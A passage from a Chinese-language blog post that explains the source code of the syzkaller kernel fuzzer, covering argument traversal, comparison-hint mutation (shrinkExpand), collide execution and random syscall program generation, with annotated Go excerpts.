<code>foreachArgImpl()</code></li><li><code>PointerArg</code> （指针类型）：判断其指向 （pointee）是否为 nil，若否，递归调用 <code>foreachArgImpl()</code></li><li><code>UnionArg</code>  （联合体类型）：递归调用 <code>foreachArgImpl()</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ForeachArg</span><span class="hljs-params">(c *Call, f <span class="hljs-keyword">func</span>(Arg, *ArgCtx)</span></span>) &#123;<br>ctx := &amp;ArgCtx&#123;&#125;<br><span class="hljs-keyword">if</span> c.Ret != <span class="hljs-literal">nil</span> &#123;<br>foreachArgImpl(c.Ret, ctx, f)<br>&#125;<br>ctx.Parent = &amp;c.Args<br>ctx.Fields = c.Meta.Args<br><span class="hljs-keyword">for</span> _, arg := <span class="hljs-keyword">range</span> c.Args &#123;<br>foreachArgImpl(arg, ctx, f)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foreachArgImpl</span><span class="hljs-params">(arg Arg, ctx *ArgCtx, f <span class="hljs-keyword">func</span>(Arg, *ArgCtx)</span></span>) &#123;<br>ctx0 := *ctx<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; *ctx = ctx0 &#125;()<br>f(arg, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">switch</span> a := arg.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *GroupArg:<br>overlayField := <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> typ, ok := a.Type().(*StructType); ok &#123;<br>ctx.Parent = &amp;a.Inner<br>ctx.Fields = typ.Fields<br>overlayField = typ.OverlayField<br>&#125;<br><span class="hljs-keyword">var</span> totalSize <span class="hljs-type">uint64</span><br><span class="hljs-keyword">for</span> i, arg1 := <span class="hljs-keyword">range</span> a.Inner &#123;<br><span class="hljs-keyword">if</span> i == overlayField &#123;<br>ctx.Offset = ctx0.Offset<br>&#125;<br>foreachArgImpl(arg1, ctx, f)<br>size := arg1.Size()<br>ctx.Offset += size<br><span class="hljs-keyword">if</span> totalSize &lt; ctx.Offset &#123;<br>totalSize = ctx.Offset - ctx0.Offset<br>&#125;<br>&#125;<br>claimedSize := a.Size()<br>varlen := a.Type().Varlen()<br><span class="hljs-keyword">if</span> varlen &amp;&amp; totalSize &gt; claimedSize || !varlen &amp;&amp; totalSize != claimedSize &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;bad group arg size %v, should be &lt;= %v for %#v type %#v&quot;</span>,<br>totalSize, claimedSize, a, a.Type().Name()))<br>&#125;<br><span class="hljs-keyword">case</span> *PointerArg:<br><span class="hljs-keyword">if</span> a.Res != <span class="hljs-literal">nil</span> &#123;<br>ctx.Base = a<br>ctx.Offset = <span class="hljs-number">0</span><br>foreachArgImpl(a.Res, ctx, f)<br>&#125;<br><span class="hljs-keyword">case</span> *UnionArg:<br>foreachArgImpl(a.Option, ctx, f)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们来看 <code>generateHints()</code> 函数，该函数首先会调用 <code>Arg</code> 接口的 <code>Type()</code> 函数获取类型并进行判断，对于大部分类型好像都是直接返回，仅有以下通过：</p><ul><li><code>ConstType</code>：会检查 <code>IsPad</code> 标志位，若不为真才会继续</li><li><code>BufferType</code> 中的 <code>BufferString, BufferGlob</code>：会检查值的长度，为 0 才会继续</li><li>其他的不在如下代码中的类型</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">generateHints</span><span class="hljs-params">(compMap CompMap, arg Arg, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>typ := arg.Type()<br><span class="hljs-keyword">if</span> typ == <span class="hljs-literal">nil</span> || arg.Dir() == DirOut &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">switch</span> t := typ.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ProcType:<br><span class="hljs-comment">// 随机的程序不会通过验证.</span><br><span class="hljs-comment">// 我们可以将其变异，但仅当结果值在合法范围内.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> *ConstType:<br><span class="hljs-keyword">if</span> IsPad(typ) &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">case</span> *CsumType:<br><span class="hljs-comment">// Csum 将不会通过验证，且总会被计算.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> *BufferType:<br><span class="hljs-keyword">switch</span> t.Kind &#123;<br><span class="hljs-keyword">case</span> BufferFilename:<br><span class="hljs-comment">// 其可以生成逃逸路径，且通常不会太有用.</span><br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> BufferString, BufferGlob:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(t.Values) != <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 这些通常是文件名或完整的枚举。</span><br><span class="hljs-comment">// 若我们拦截 strcmp，将其变异可能是有用的</span><br><span class="hljs-comment">// (并过滤掉文件名).</span><br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 最后会根据参数实际的存储类型进行判断：</p><ul><li>对于常量参数 <code>ConstArg</code> 类型会调用 <code>checkConstArg()</code> 处理</li><li>对于数据参数 <code>DataArg</code> 类型，首先会判断是否为 <code>BufferCompressed</code> 类型，若是则调用 <code>checkCompressedArg()</code> ，否则调用 <code>checkDataArg()</code> 处理</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> a := arg.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ConstArg:<br>checkConstArg(a, compMap, exec)<br><span class="hljs-keyword">case</span> *DataArg:<br><span class="hljs-keyword">if</span> typ.(*BufferType).Kind == BufferCompressed &#123;<br>checkCompressedArg(a, compMap, exec)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>checkDataArg(a, compMap, exec)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这三个函数都会调用到 <code>shrinkExpand()</code>，所以我们先来看看这个函数的实现，该函数用以<strong>使用给定的 CompMap 对参数进行替换，返回结果为可以用来进行替换的新参数值</strong>，其具体实现我们就不深入了，这里来看注释：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Shrink and expand mutations 在当系统调用参数被转化为更狭窄（与更宽阔）的整型类型时</span><br><span class="hljs-comment">// 对这些情况进行建模.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 收缩的动机:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//void f(u16 x) &#123;</span><br><span class="hljs-comment">//u8 y = (u8)x;</span><br><span class="hljs-comment">//if (y == 0xab) &#123;...&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 若我们调用 f(0x1234), 我们将看到在 0x34 与 0xab 间的比较，</span><br><span class="hljs-comment">// 我们将没法将参数 0x1234 与任何比较操作数匹配.</span><br><span class="hljs-comment">// 由此我们将 0x1234 收缩到 0x34 并尝试匹配 0x34.</span><br><span class="hljs-comment">// 若对于收缩后的值存在一个匹配，则我们替换输入中相应的字节</span><br><span class="hljs-comment">//  (在给出的例子中我们将获得 0x12ab).</span><br><span class="hljs-comment">// 有的时候其他的比较操作数将比收缩后的值要宽</span><br><span class="hljs-comment">// (在上面的例子中考虑比较 if (y == 0xdeadbeef) &#123;...&#125;).</span><br><span class="hljs-comment">// 这种情况下我们忽略这样的比较因为我们无法给出做着类似事情的合法代码🌰.</span><br><span class="hljs-comment">// 为了避免这样的比较，我们我们使用 leastSize() 检查其 size. </span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 扩展的动机:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//void f(i8 x) &#123;</span><br><span class="hljs-comment">//i16 y = (i16)x;</span><br><span class="hljs-comment">//if (y == -2) &#123;...&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 假如我们调用 f(-1), 我们将看到在 0xffff 与 0xfffe 间的比较，</span><br><span class="hljs-comment">// 并无法将输入与任何操作数匹配. 由此我们对输入进行符号扩展并检查扩展.</span><br><span class="hljs-comment">// 与收缩一样，我们忽略了另一个操作数更宽的情况.</span><br><span class="hljs-comment">// 需要注意的是 executor 将所有的比较操作数符号扩展至 int64.</span><br></code></pre></td></tr></table></figure><p>下面我们来看这三个 <code>check*Arg()</code> ，我们首先看用来处理常量的 <code>checkConstArg()</code>，主要逻辑是嗲用 <code>shrinkExpand()</code> 并对其结果（<code>CompMap</code> 类型）进行遍历，将 <code>arg.Val</code> 依次替换为其提供的 replacer 值，并调用上层回调函数（也就是 <code>execValidate()</code> ，里面还会调用上层传入的闭包函数，最后会调用 <code>proc.execute()</code> ，也就是说<strong>对于 shrinkExpand() 提供的每个替换结果其都会执行一次</strong>）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkConstArg</span><span class="hljs-params">(arg *ConstArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>original := arg.Val<br><span class="hljs-comment">// Note: because shrinkExpand returns a map, order of programs is non-deterministic.</span><br><span class="hljs-comment">// This can affect test coverage reports.</span><br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(original, compMap, arg.Type().TypeBitSize(), <span class="hljs-literal">false</span>) &#123;<br>arg.Val = replacer<br>exec()<br>&#125;<br>arg.Val = original<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来看 <code>checkCompressedArg()</code> ，主要就是将数据解压后逐 4 字节进行遍历，每次遍历时都会再调用 <code>shrinkExpand()</code> 获取可替换值并再对其结果进行遍历，调用上层传入的闭包函数执行替换数据后的程序：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkCompressedArg</span><span class="hljs-params">(arg *DataArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>data0 := arg.Data()<br>data, dtor := image.MustDecompress(data0)<br><span class="hljs-keyword">defer</span> dtor()<br><span class="hljs-comment">// Images are very large so the generic algorithm for data arguments</span><br><span class="hljs-comment">// can produce too many mutants. For images we consider only</span><br><span class="hljs-comment">// 4/8-byte aligned ints. This is enough to handle all magic</span><br><span class="hljs-comment">// numbers and checksums. We also ignore 0 and ^uint64(0) source bytes,</span><br><span class="hljs-comment">// because there are too many of these in lots of images.</span><br>bytes := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(data); i += <span class="hljs-number">4</span> &#123;<br>original := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-built_in">copy</span>(original, data[i:])<br>val := binary.LittleEndian.Uint64(original)<br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(val, compMap, <span class="hljs-number">64</span>, <span class="hljs-literal">true</span>) &#123;<br>binary.LittleEndian.PutUint64(bytes, replacer)<br><span class="hljs-built_in">copy</span>(data[i:], bytes)<br>arg.SetData(image.Compress(data))<br>exec()<br>&#125;<br><span class="hljs-built_in">copy</span>(data[i:], original)<br>&#125;<br>arg.SetData(data0)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>checkDataArg()</code> 逻辑基本上与 <code>checkCompressedArg()</code> 一致，不过是逐字节遍历且没有解压过程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkDataArg</span><span class="hljs-params">(arg *DataArg, compMap CompMap, exec <span class="hljs-keyword">func</span>()</span></span>) &#123;<br>bytes := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br>data := arg.Data()<br>size := <span class="hljs-built_in">len</span>(data)<br><span class="hljs-keyword">if</span> size &gt; maxDataLength &#123;<br>size = maxDataLength<br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; size; i++ &#123;<br>original := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br><span class="hljs-built_in">copy</span>(original, data[i:])<br>val := binary.LittleEndian.Uint64(original)<br><span class="hljs-keyword">for</span> _, replacer := <span class="hljs-keyword">range</span> shrinkExpand(val, compMap, <span class="hljs-number">64</span>, <span class="hljs-literal">false</span>) &#123;<br>binary.LittleEndian.PutUint64(bytes, replacer)<br><span class="hljs-built_in">copy</span>(data[i:], bytes)<br>exec()<br>&#125;<br><span class="hljs-built_in">copy</span>(data[i:], original)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="proc-executeAndCollide-：简易的变异执行："><a href="#proc-executeAndCollide-：简易的变异执行：" class="headerlink" title="proc.executeAndCollide()：简易的变异执行："></a>proc.executeAndCollide()：简易的变异执行：</h4><p>该函数的逻辑比较简单，首先会将程序执行一次，之后循环执行两次，不过会调用 <code>proc.randomCollide()</code> 先将原始程序进行处理后再执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeAndCollide(execOpts *ipc.ExecOpts, p *prog.Prog, flags ProgTypes, stat Stat) &#123;<br>proc.execute(execOpts, p, flags, stat)<br><br><span class="hljs-keyword">if</span> proc.execOptsCollide.Flags&amp;ipc.FlagThreaded == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// We cannot collide syscalls without being in the threaded mode.</span><br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">const</span> collideIterations = <span class="hljs-number">2</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; collideIterations; i++ &#123;<br>proc.executeRaw(proc.execOptsCollide, proc.randomCollide(p), StatCollide)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>randomCollide()</code> 流程如下：</p><ul><li>首先会有 20% 的几率调用 <code>prog.DoubleExecCollide()</code> （把源程序拷贝一份附加到其自身的末，并使用第一部分的资源），若未出错则直接返回</li><li>接下来有 20% 的几率调用 <code>prog.DupCallCollide()</code> （将程序中的部分调用进行复制并标记为异步），若未出错则直接返回</li><li>最后会调用 <code>prog.AssignRandomAsync()</code> （确保使用一个异步调用生产的资源的调用与其至少间隔一个非异步调用）并有 50% 的几率调用 <code>prog.AssignRandomRerun()</code>：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> randomCollide(origP *prog.Prog) *prog.Prog &#123;<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">5</span>) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Old-style collide with a 20% probability.</span><br>p, err := prog.DoubleExecCollide(origP, proc.rnd)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> p<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">4</span>) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Duplicate random calls with a 20% probability (25% * 80%).</span><br>p, err := prog.DupCallCollide(origP, proc.rnd)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> p<br>&#125;<br>&#125;<br>p := prog.AssignRandomAsync(origP, proc.rnd)<br><span class="hljs-keyword">if</span> proc.rnd.Intn(<span class="hljs-number">2</span>) != <span class="hljs-number">0</span> &#123;<br>prog.AssignRandomRerun(p, proc.rnd)<br>&#125;<br><span class="hljs-keyword">return</span> p<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="生成新输入-变异现有输入，执行"><a href="#生成新输入-变异现有输入，执行" class="headerlink" title="生成新输入&#x2F;变异现有输入，执行"></a>生成新输入&#x2F;变异现有输入，执行</h2><p>继续回到 <code>loop()</code> 的无限循环中，如果说全局 <code>WorkQueue</code> 空了，说明这个时候我们要自己想办法弄新的输入了，首先我们要获取 syz-fuzzer 当前的快照（其中包括语料库、语料库权重值、总的权重值），之后进行判断：</p><ul><li>若语料库为空，或是已经进行了 <code>generatePeriod</code> 次循环，此时调用 <code>target.Generate()</code> 生成新的输入程序</li><li>否则，选择一份现有的输入，调用 <code>prog.Mutate()</code> 将该输入进行变异，生成新的输入</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go">ct := proc.fuzzer.choiceTable<br>fuzzerSnapshot := proc.fuzzer.snapshot()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(fuzzerSnapshot.corpus) == <span class="hljs-number">0</span> || i%generatePeriod == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Generate a new prog.</span><br>p := proc.fuzzer.target.Generate(proc.rnd, prog.RecommendedCalls, ct)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: generated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatGenerate)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// Mutate an existing prog.</span><br>p := fuzzerSnapshot.chooseProgram(proc.rnd).Clone()<br>p.Mutate(proc.rnd, prog.RecommendedCalls, ct, proc.fuzzer.noMutate, fuzzerSnapshot.corpus)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: mutated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatFuzz)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="【核心】target-Generate-：生成一个新的输入程序"><a href="#【核心】target-Generate-：生成一个新的输入程序" class="headerlink" title="【核心】target.Generate()：生成一个新的输入程序"></a>【核心】target.Generate()：生成一个新的输入程序</h3><p>该函数本体其实比较简短，主要就是随机生成指定数量的系统调用并打包到一个新的 <code>Prog</code> 结构体当中，生成的依据主要是我们前面给出的 <code>ChoiceTable</code> 表，最后移除程序末尾多余的系统调用便直接返回了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Generate 生成一个带有 ncalls 个调用的随机程序.</span><br><span class="hljs-comment">// ct 包含一组允许的系统调用, 若为 nil 则将使用所有的系统调用.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> Generate(rs rand.Source, ncalls <span class="hljs-type">int</span>, ct *ChoiceTable) *Prog &#123;<br>p := &amp;Prog&#123;<br>Target: target,<br>&#125;<br>r := newRand(target, rs)<br>s := newState(target, ct, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &lt; ncalls &#123;<br>calls := r.generateCall(s, p, <span class="hljs-built_in">len</span>(p.Calls))<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> calls &#123;<br>s.analyze(c)<br>p.Calls = <span class="hljs-built_in">append</span>(p.Calls, c)<br>&#125;<br>&#125;<br><span class="hljs-comment">// 对于生成的最后一个调用而言，我们有可能在创造资源的同时增加额外的系统调用，</span><br><span class="hljs-comment">// 从而导致调用数量超过 ncalls。移除部分调用。</span><br>    <span class="hljs-comment">/* 译注：例如 read 需要一个 fd，那可能前面会再补一个 open */</span><br><span class="hljs-comment">// 在最后的调用中的资源会被替换为默认值,这便是我们所想要的。</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ncalls &#123;<br>p.RemoveCall(ncalls - <span class="hljs-number">1</span>)<br>&#125;<br>p.sanitizeFix()<br>p.debugValidate()<br><span class="hljs-keyword">return</span> p<br>&#125;<br><br></code></pre></td></tr></table></figure><p>生成单个系统调用的核心函数是 <code>generateCall()</code>：</p><ul><li>首先会检查 <code>insertPoint</code> 是否不为 0（为 0 则说明刚开始生成第一个系统调用），若是则随机选取程序中已有的一个调用，若其未设置 <code>NoGenerate</code> 属性则将其 id （系统调用号）作为 <code>biasCall</code>，即<strong>生成的第一个系统调用完全随机，后续系统调用则根据优先级表进行生成</strong></li><li>接下来调用 ChoiceTable 的 <code>choose</code> 方法，对于第一个系统调用而言其会从 ChoiceTable 中随机选取一个系统调用作为 <code>biasCall</code>，接下来从优先级表中选取 <code>biasCall</code> 对应的优先级数据，从中随机选取一个范围中优先级最高的一个返回</li><li>最后调用 <code>generateParticularCall()</code> 生成该系统调用所要用到的数据，这里就不展开了</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ct *ChoiceTable)</span></span> choose(r *rand.Rand, bias <span class="hljs-type">int</span>) <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">if</span> bias &lt; <span class="hljs-number">0</span> &#123;<span class="hljs-comment">/* 第一个系统调用，随机选择 */</span><br>bias = ct.calls[r.Intn(<span class="hljs-built_in">len</span>(ct.calls))].ID<br>&#125;<br><span class="hljs-keyword">if</span> !ct.Generatable(bias) &#123;<br>fmt.Printf(<span class="hljs-string">&quot;bias to disabled or non-generatable syscall %v\n&quot;</span>, ct.target.Syscalls[bias].Name)<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;disabled or non-generatable syscall&quot;</span>)<br>&#125;<br>run := ct.runs[bias]<br>x := <span class="hljs-type">int32</span>(r.Intn(<span class="hljs-type">int</span>(run[<span class="hljs-built_in">len</span>(run)<span class="hljs-number">-1</span>])) + <span class="hljs-number">1</span>)<span class="hljs-comment">/* 选择优先级范围 */</span><br>res := sort.Search(<span class="hljs-built_in">len</span>(run), <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> run[i] &gt;= x<br>&#125;)<br><span class="hljs-keyword">if</span> !ct.Generatable(res) &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;selected disabled or non-generatable syscall&quot;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> res<br>&#125;<br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span 